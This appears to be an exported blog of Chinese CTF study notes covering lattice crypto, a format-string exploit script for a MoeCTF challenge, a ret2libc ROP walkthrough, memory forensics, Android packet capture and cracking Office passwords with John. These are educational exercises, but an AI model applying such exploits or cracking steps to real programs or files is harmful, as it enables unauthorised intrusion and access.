    <content><![CDATA[<p><a class="link"   href="https://www.cnblogs.com/JustGo12/p/18009944" >L3HCTF 2024 -Cry部分 - JustG0 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://cn-sec.com/archives/474106.html" >2021第二届祥云杯Crypto部分Write-Up全 | CN-SEC 中文网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>待学</category>
      </categories>
  </entry>
  <entry>
    <title>汉明距离</title>
    <url>/2024/07/31/Crypto/%E5%BE%85%E5%AD%A6/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<p><a class="link"   href="https://www.jianshu.com/p/ecd767d9af0d" >2019-De1CTF-xorz - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>待学</category>
      </categories>
  </entry>
  <entry>
    <title>tool</title>
    <url>/2024/07/30/Crypto/%E6%A0%BC%E5%AF%86%E7%A0%81/tool/</url>
    <content><![CDATA[<p><a class="link"   href="https://github.com/keeganryan/flatter" >keeganryan&#x2F;flatter: Fast lattice reduction (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>格密码</category>
      </categories>
  </entry>
  <entry>
    <title>基本形式</title>
    <url>/2024/02/19/Crypto/%E6%A0%BC%E5%AF%86%E7%A0%81/%E5%9F%BA%E6%9C%AC%E5%BD%A2%E5%BC%8F/</url>
    <content><![CDATA[<p><a class="link"   href="https://dexterjie.github.io/2023/07/29/%E6%A0%BC%E5%AF%86%E7%A0%81%E5%85%A5%E9%97%A8/" >https://dexterjie.github.io/2023/07/29/%E6%A0%BC%E5%AF%86%E7%A0%81%E5%85%A5%E9%97%A8/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tover.xyz/p/LLL-attack-equation/#%E9%85%8D%E5%B9%B3" >格密码入门 | DexterJie’Blog (tover.xyz) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># assert len(flag) == 47</span></span><br><span class="line"><span class="comment">#376bit</span></span><br><span class="line"><span class="comment"># flag=b&#x27;SICTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line"><span class="comment"># f = bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># p = getPrime(512)</span></span><br><span class="line"><span class="comment"># g = getPrime(128)</span></span><br><span class="line"><span class="comment"># h = gmpy2.invert(f, p) * g % p</span></span><br><span class="line"><span class="comment"># print(&#x27;h =&#x27;, h)</span></span><br><span class="line"><span class="comment"># print(&#x27;p =&#x27;, p)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">配平</span></span><br><span class="line"><span class="string">g=fh+kp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">D=<span class="number">2</span>**<span class="number">248</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">h = <span class="number">9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443</span></span><br><span class="line">p = <span class="number">11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947</span>     </span><br><span class="line">Ge = Matrix(ZZ,[[<span class="number">1</span>,D*h],[<span class="number">0</span>,D*p]])<span class="comment">#</span></span><br><span class="line"><span class="built_in">print</span>(Ge.LLL())</span><br><span class="line">f,g = Ge.LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = <span class="built_in">abs</span>(f),<span class="built_in">abs</span>(g)//D</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(f))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="LLL算法需要的是矩阵参数，最简单的矩阵如下-D属于任意整数-begin-bmatrix-1-amp-D-h-0-amp-D-q-end-bmatrix-其满足下列条件-begin-bmatrix-f-amp-k-end-bmatrix-begin-bmatrix-1-amp-D-h-0-amp-D-q-end-bmatrix"><a href="#LLL算法需要的是矩阵参数，最简单的矩阵如下-D属于任意整数-begin-bmatrix-1-amp-D-h-0-amp-D-q-end-bmatrix-其满足下列条件-begin-bmatrix-f-amp-k-end-bmatrix-begin-bmatrix-1-amp-D-h-0-amp-D-q-end-bmatrix" class="headerlink" title="LLL算法需要的是矩阵参数，最简单的矩阵如下 D属于任意整数$$\begin{bmatrix}    1 &amp; D h   \    0 &amp; D q   \\end{bmatrix}$$其满足下列条件$$\begin{bmatrix} f &amp; -k \end{bmatrix}\begin{bmatrix}    1 &amp; D h   \    0 &amp; D q   \\end{bmatrix}"></a>LLL算法需要的是矩阵参数，最简单的矩阵如下 D属于任意整数<br>$$<br>\begin{bmatrix}<br>    1 &amp; D h   \<br>    0 &amp; D q   \<br>\end{bmatrix}<br>$$<br>其满足下列条件<br>$$<br>\begin{bmatrix} f &amp; -k \end{bmatrix}<br>\begin{bmatrix}<br>    1 &amp; D h   \<br>    0 &amp; D q   \<br>\end{bmatrix}</h1><p>\begin{bmatrix} f &amp; D g \end{bmatrix}<br>$$</p>
<p>配平需要满足<br>$$<br>f \approx D \cdot g<br>$$</p>
<p>例如上面的f为376bit,g为128位,所以D为2^248 位数大致相同即可</p>
]]></content>
      <categories>
        <category>Crypto</category>
        <category>格密码</category>
      </categories>
  </entry>
  <entry>
    <title>Fmtstr</title>
    <url>/2024/06/09/Pwn/linux/Fmtstr/</url>
    <content><![CDATA[<p>主要利用<code>printf(&quot;用户输入&quot;)</code>达成任意地址读写</p>
<p>写入主要使用 <code>%n</code>占位符(将该占位符之前的字符数输出到对应地址)</p>
<blockquote>
<table>
<thead>
<tr>
<th>占位符</th>
<th>字节数</th>
</tr>
</thead>
<tbody><tr>
<td>%lln</td>
<td>8</td>
</tr>
<tr>
<td>%n</td>
<td>4</td>
</tr>
<tr>
<td>%hn</td>
<td>2</td>
</tr>
<tr>
<td>%hhn</td>
<td>1</td>
</tr>
</tbody></table>
</blockquote>
<p>再结合%数字$占位符</p>
<p>例如</p>
<blockquote>
<p>%2$s 指的就是第二个参数当作s输出</p>
</blockquote>
<p>结合这两个，如果我要写入一个’a’(0x61)到对应地址0x12345678，假设此时我的字符串在偏移3</p>
<p>就可以用<code>&quot;\x78\x56\x34\x12%93c%3$n&quot;</code>payload不唯一，可学习下pwntools中FmtStr的输出</p>
<p>Example</p>
<blockquote>
<p>[<a class="link"   href="https://www.nssctf.cn/problem/3332" >MoeCTF 2022]babyfmt | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>主要逻辑</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *s; // [esp+18h] [ebp-110h]</span><br><span class="line">  char buf[256]; // [esp+1Ch] [ebp-10Ch] BYREF</span><br><span class="line">  unsigned int v5; // [esp+11Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stderr, 0, 2, 0);</span><br><span class="line">  s = (char *)malloc(0x10u);</span><br><span class="line">  sprintf(s, &quot;%p&quot;, backdoor);</span><br><span class="line">  printf(&quot;gift: %p\n&quot;, s);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(buf, 0, sizeof(buf));</span><br><span class="line">    read(0, buf, 0xFFu);</span><br><span class="line">    printf(buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">r&quot;/home/wrwrw/vscode/pwn/fmtstr/pwn&quot;</span>)</span><br><span class="line">debug=<span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> debug==<span class="literal">True</span>:</span><br><span class="line">    p=process(<span class="string">r&#x27;/home/wrwrw/vscode/pwn/fmtstr/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span> ,<span class="number">24923</span> )</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=<span class="string">&#x27;bash&#x27;</span>,endian = <span class="string">&quot;little&quot;</span>)<span class="comment">#需要设定对应的架构和端序才能正常使用fmtstr</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_read</span>(<span class="params">offset,addr,<span class="built_in">type</span></span>):</span><br><span class="line">    <span class="keyword">return</span> p32(addr)+(<span class="string">f&#x27;%<span class="subst">&#123;offset&#125;</span>$<span class="subst">&#123;<span class="built_in">type</span>&#125;</span>&#x27;</span>).encode() <span class="keyword">if</span> context.bits==<span class="number">32</span> <span class="keyword">else</span> p64(addr)+(<span class="string">f&#x27;%<span class="subst">&#123;offset&#125;</span>$<span class="subst">&#123;<span class="built_in">type</span>&#125;</span>&#x27;</span>).encode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">payload</span>):<span class="comment">#用于给FmtStr测试对应的我们input字符串的offset(相对于printf函数体内的栈顶)</span></span><br><span class="line">    p.sendline(payload)<span class="comment">#这是最简单的情况,其他的可能会结合判断语句什么的可根据这个适当修改</span></span><br><span class="line">    info = p.recv()</span><br><span class="line">    <span class="keyword">return</span> info<span class="comment">#FmtStr只需要获得对应输入的printf输出即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    gift_addr=<span class="built_in">int</span>(re.search(<span class="string">r&quot;gift: 0x([0-9a-f]*)&quot;</span>,p.recvline().decode().strip()).group(<span class="number">1</span>),<span class="number">16</span>)<span class="comment">#获取对应backdoor地址字符串的地址</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(gift_addr))</span><br><span class="line">    printf_got=elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">    fmt=FmtStr(exec_fmt)</span><br><span class="line">    p.send(fmtstr_read(fmt.offset,gift_addr,<span class="string">&#x27;s&#x27;</span>))<span class="comment">#获取对应backdoor地址</span></span><br><span class="line">    backdoor_addr=<span class="built_in">int</span>(p.recv()[<span class="number">4</span>:].decode(),<span class="number">16</span>)</span><br><span class="line">    payload=fmtstr_payload(fmt.offset,&#123;printf_got:backdoor_addr&#125;)<span class="comment">#将printf_got地址上写入backdoor_addr地址(大小取决于架构)</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>

</blockquote>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>elf文件结构</title>
    <url>/2024/06/19/Pwn/linux/elf%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p><a class="link"   href="https://www.jianshu.com/p/5092d6d5caa3" >彻底搞清楚 GOT 和 PLT - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>ret2libc</title>
    <url>/2023/07/21/Pwn/linux/ret2libc/</url>
    <content><![CDATA[<p>ret2libc基于没有system或没有&#x2F;bin&#x2F;sh($0可以代替,因为在linux环境变量$0就是当前终端)的情况，构造出一条ret调用链来</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip install ROPgadget</span><br></pre></td></tr></table></figure></div>

<p>ROPgadget可以用于获取需要的字符串，汇编指令，最后可以通过栈溢出跳往对应的汇编指令中</p>
<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip install LibcSearcher</span><br></pre></td></tr></table></figure></div>

<p>该工具可以根据你所给的指令名称对应的指令地址获取对应的外部got表地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307210035601.png"
                      alt="image-20230721003509555"
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;指令名称&#x27;</span>,指令地址)<span class="comment">#可以获取内部got表对应地址所对应的glibc</span></span><br><span class="line">libc.dump(<span class="string">&quot;需要的指令&quot;</span>)<span class="comment">#可以获取需要指令的外部got表地址</span></span><br></pre></td></tr></table></figure></div>



<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><table>
<thead>
<tr>
<th align="left">section</th>
<th align="left">所在 segment</th>
<th align="left">section 属性</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.plt</td>
<td align="left">代码段</td>
<td align="left">RE（可读，可执行）</td>
<td align="left">.plt section 实际就是通常所说的过程链接表（Procedure Linkage Table, PLT）</td>
</tr>
<tr>
<td align="left">.plt.got</td>
<td align="left">代码段</td>
<td align="left">RE</td>
<td align="left">.plt.got section 用于存放 __cxa_finalize 函数对应的 PLT 条目</td>
</tr>
<tr>
<td align="left">.got</td>
<td align="left">数据段</td>
<td align="left">RW（可读，可写）</td>
<td align="left">.got section 中可以用于存放全局变量的地址；.got section 中也可以用于存放不需要延迟绑定的函数的地址。</td>
</tr>
<tr>
<td align="left">.got.plt</td>
<td align="left">数据段</td>
<td align="left">RW</td>
<td align="left">.got.plt section 用于存放需要延迟绑定的函数的地址</td>
</tr>
</tbody></table>
<h4 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h4><p>当puts elfgot表内函数地址时，会puts出真正的表内的函数地址</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#获取的实际上是got.plt地址</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">inputs=<span class="number">0x40066B</span></span><br><span class="line">pop_rdi_retn=<span class="number">0x400743</span><span class="comment">#ROPgadget --binary babyof --only &#x27;pop|ret&#x27; |grep rdi</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Do&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*o+p64(pop_rdi_retn)+p64(puts_got)+p64(puts_plt)+p64(inputs)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#当收到Do就输出后面的字符串</span></span><br></pre></td></tr></table></figure></div>

<p>pop_rdi_retn 将当前栈顶值(puts_got)传给rdi,然后将栈顶的指针向下移动到(puts_plt),并在之后跳转到栈顶值(puts_plt)</p>
<p>rdi(puts_got)将作为参数被puts_plt(puts函数)输出</p>
<p>因此可以泄露出puts的实际got表地址,不是elf中的got.plt</p>
<h4 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h4><p>详情可见[StormQ’s Blog (csstormq.github.io)](<a class="link"   href="https://csstormq.github.io/blog/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AF%87%E4%B9%8B%E9%93%BE%E6%8E%A5%EF%BC%8814%EF%BC%89%EF%BC%9A.plt%E3%80%81.plt.got%E3%80%81.got" >https://csstormq.github.io/blog/计算机系统篇之链接（14）：.plt、.plt.got、.got <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和 .got.plt section 之间的区别)</p>
<p>因为system函数地址未知，但我们可以通过外部got表的地址，计算内部got表地址，获取got表内的函数(当加载libc的时候，函数都会在got表内),got表内函数的相对地址不会变</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)<span class="comment">#此处是与泄露的got地址相减，就可以获取got表的基址了</span></span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)<span class="comment">#因为函数相对地址不变,就可以找到内部got表内的system函数地址</span></span><br></pre></td></tr></table></figure></div>

<h4 id="shell字符串"><a href="#shell字符串" class="headerlink" title="shell字符串"></a>shell字符串</h4><p>题目中可能没有提供字符串，在libc中会含有该字符串，当泄露了got表后可以获得</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">system=base+libc.dump(&#x27;system&#x27;)#因为函数相对地址不变,就可以找到内部got表内的system函数地址</span><br></pre></td></tr></table></figure></div>

<h4 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h4><p>x64常用rdi作为传递的第一个参数，所以我们需要一个将shell地址传给rdi的汇编指令(可以将shell字符串的地址存在栈中，通过pop edi调用)，同时又得让命令走向按照我们的意愿来，所以还得有个retn</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop rdi</span><br><span class="line"></span><br><span class="line">retn</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary &quot;二进制文件&quot; --only &#x27;pop|ret&#x27; |grep rdi #可以获取pop rdi retn的地址</span><br></pre></td></tr></table></figure></div>

<h3 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h3><p>system函数需要栈为16字节的倍数，因为此处只用了24字节(传参地址,shell字符串地址,system地址)</p>
<p>还需要一个地址作为占位,可以选择只有retn指令的地址</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary &quot;二进制文件&quot; --only &#x27;ret&#x27; #获取只有retn命令的地址</span><br></pre></td></tr></table></figure></div>



<h3 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h3><p>需要有个具体的栈的顺序</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(retn地址,传参地址,shell字符串地址,system地址)</span><br></pre></td></tr></table></figure></div>

<p>这样随着逐渐retn就可以获取shell了</p>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>内存取证</title>
    <url>/2023/07/22/Misc/%E5%8F%96%E8%AF%81/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<h2 id="只是一些草稿"><a href="#只是一些草稿" class="headerlink" title="只是一些草稿"></a>只是一些草稿</h2><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p>取证工具地址<a class="link"   href="https://github.com/volatilityfoundation/volatility3" >volatility3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>参考<a class="link"   href="https://blog.csdn.net/m0_68012373/article/details/127419463" >(42条消息) 内存取证-volatility工具的使用 （史上更全教程，更全命令）_路baby的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>可以在插件后面跟-h获取该插件的帮助</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vol -f &quot;windows内存转储地址&quot;  windows.info #分析该内存转储的操作系统等其余信息</span><br><span class="line">vol -f &quot;windows内存转储地址&quot;  windows.pslist #会分析该内存的运行进程</span><br><span class="line">vol -f &quot;windows内存转储地址&quot; windows.filescan #分析有什么文件,其中地址是physaddr</span><br><span class="line">vol -f &quot;windows内存转储地址&quot; windows.dump -h</span><br><span class="line">usage: volatility windows.dumpfiles.DumpFiles [-h] [--pid PID] [--virtaddr VIRTADDR] [--physaddr PHYSADDR]</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help           show this help message and exit</span><br><span class="line">  --pid PID            Process ID to include (all other processes are excluded)</span><br><span class="line">  --virtaddr VIRTADDR  Dump a single _FILE_OBJECT at this virtual address</span><br><span class="line">  --physaddr PHYSADDR  Dump a single _FILE_OBJECT at this physical address</span><br><span class="line">  vol -f &quot;windows内存转储地址&quot; windows.dump --physaddr &quot;具体文件地址，详情可见windows.filescan插件的结果&quot; #可以将内存文件输出出来</span><br></pre></td></tr></table></figure></div>

<p>如果无法输出也可以通过diskgenius挂载该转储文件(作为虚拟硬盘),具体方法如下</p>
<p>1.将其作为虚拟硬盘打开</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307231459232.png"
                      alt="image-20230723145957046"
                ></p>
<p>2.右下角查看文件类型改为所有文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307231501287.png"
                      alt="image-20230723150121254"
                ></p>
<p>3.右键新出现的虚拟硬盘,选择已删除或格式化后的文件恢复</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307231507155.png"
                      alt="image-20230723150714113"
                ></p>
<p>即可打开对应的镜像获取文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20230723150407151.png"
                      alt="image-20230723150407151"
                ></p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[巅峰极客 2022easy_Forensic - Runwu2204](<a class="link"   href="https://runwu2204.github.io/2023/07/23/CTF" >https://runwu2204.github.io/2023/07/23/CTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> WP&#x2F;Misc&#x2F;巅峰极客 2022easy_Forensic&#x2F;)</p>
<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1>]]></content>
      <categories>
        <category>Misc</category>
        <category>取证</category>
      </categories>
  </entry>
  <entry>
    <title>CS流量</title>
    <url>/2024/02/20/Misc/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/CS%E6%B5%81%E9%87%8F/</url>
    <content><![CDATA[<p>参考:<a class="link"   href="https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/" >fdlucifer.github.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Misc</category>
        <category>流量分析</category>
      </categories>
  </entry>
  <entry>
    <title>wireshark字符串搜索</title>
    <url>/2023/08/06/Misc/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/wireshark%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202308061414917.png"
                     
                ></p>
<p>只需要根据要搜索的选项改变搜索类型即可，也可直接通过全局搜索16进制数</p>
]]></content>
      <categories>
        <category>Misc</category>
        <category>流量分析</category>
      </categories>
  </entry>
  <entry>
    <title>安卓抓包</title>
    <url>/2024/01/21/Misc/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<h2 id="tcpdump-android"><a href="#tcpdump-android" class="headerlink" title="tcpdump-android"></a>tcpdump-android</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>为了防止动态链接库问题，有专门给安卓设计的tcpdump</p>
<p><a class="link"   href="https://www.androidtcpdump.com/android-tcpdump/downloads" >tcpdump 二进制文件下载（32 位）|安卓 tcpdump (androidtcpdump.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>直接adb push到&#x2F;data&#x2F;local&#x2F;tmp&#x2F;即可，需要调整执行权限</p>
<h3 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h3><p>最好将pcap转存到&#x2F;data&#x2F;local&#x2F;tmp&#x2F;<code>tcpdump -w /data/local/tmp/1.pcap</code></p>
<p>可以手动用ctrl-c控制tcpdump的启停，也可以通过timeout定时抓取</p>
<p>例子如下 定时抓包十秒并传出<code>adb shell &quot;su -c timeout 10 tcpdump -w /data/local/tmp/1.pcap&quot; || adb pull /data/local/tmp/1.pcap D:\Desktop </code>       因为前面的会中断返回0所以用或符号保证两者运行</p>
]]></content>
      <categories>
        <category>Misc</category>
        <category>流量分析</category>
      </categories>
  </entry>
  <entry>
    <title>PIL</title>
    <url>/2024/05/01/Misc/%E6%9D%82%E5%AD%A6/PIL/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Misc</category>
        <category>杂学</category>
      </categories>
  </entry>
  <entry>
    <title>ZIP文件明文攻击</title>
    <url>/2024/01/21/Misc/%E6%9D%82%E5%AD%A6/ZIP%E6%96%87%E4%BB%B6%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="pkcrack"><a href="#pkcrack" class="headerlink" title="pkcrack"></a>pkcrack</h2><h2 id="bkcrack"><a href="#bkcrack" class="headerlink" title="bkcrack"></a>bkcrack</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>Misc</category>
        <category>杂学</category>
      </categories>
  </entry>
  <entry>
    <title>bkcrack</title>
    <url>/2023/09/18/Misc/%E6%9D%82%E5%AD%A6/bkcrack/</url>
    <content><![CDATA[<p>通过利用压缩包内的一部分字节破解加密的压缩包</p>
<p><a class="link"   href="https://blog.csdn.net/q851579181q/article/details/109767425" >ZIP已知明文攻击深入利用_明文攻击密码软件-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Misc</category>
        <category>杂学</category>
      </categories>
  </entry>
  <entry>
    <title>kali John破解密码</title>
    <url>/2023/07/28/Misc/%E6%9D%82%E5%AD%A6/kali%20John%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><h2 id="使用相应的john获取对应文件的密码hash"><a href="#使用相应的john获取对应文件的密码hash" class="headerlink" title="使用相应的john获取对应文件的密码hash"></a>使用相应的john获取对应文件的密码hash</h2><p>此处以破解office的密码为例</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">office2john 从渗透看取证.pptx<span class="comment">#其会输出对应的密码hash</span></span></span><br><span class="line"></span><br><span class="line">从渗透看取证证.pptx:$office$*2007*20*128*16*ae5cec7759d56eba49f6e923a4657c6c*5c91c78a0990d6c1791b3d6577056ada*a1b73a76fb87442b4ecc8f9b3702784312f8a7e2 </span><br></pre></td></tr></table></figure></div>

<p>john破解一般读取的是文本文件内的hash，所以用管道符号输出至文件</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">office2john 从渗透看取证.pptx<span class="comment">#其会输出对应的密码hash &gt; a</span></span></span><br></pre></td></tr></table></figure></div>



